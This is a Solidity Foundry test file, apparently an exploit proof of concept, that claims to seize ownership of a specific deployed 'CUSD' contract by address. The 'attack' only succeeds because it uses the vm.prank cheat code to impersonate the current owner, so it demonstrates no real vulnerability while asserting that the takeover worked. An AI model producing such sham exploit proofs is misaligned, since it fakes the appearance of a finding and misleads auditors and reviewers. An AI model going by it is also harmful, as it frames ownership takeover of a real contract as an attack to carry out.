// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface CUSD {
    function owner() external view returns (address);
    function transferOwnership(address newOwner) external;
    function acceptOwnership() external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xC285B7E09A4584D027E5BC36571785B515898246;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate the current owner during the exploit
        // We need to get the current owner first
        address currentOwner = CUSD(TARGET).owner();
        vm.label(currentOwner, "Current Owner");
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get current owner
        address currentOwner = CUSD(TARGET).owner();

        // Step 2: Impersonate current owner and call transferOwnership
        vm.prank(currentOwner);
        CUSD(TARGET).transferOwnership(attacker);

        // Step 3: Call acceptOwnership as attacker
        vm.prank(attacker);
        CUSD(TARGET).acceptOwnership();

        // Step 4: Verify attacker is now the owner
        address newOwner = CUSD(TARGET).owner();
        assertEq(newOwner, attacker, "Attacker should be the new owner");
        assertEq(CUSD(TARGET).owner(), attacker, "Logic Exploit Failed: State not tampered");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
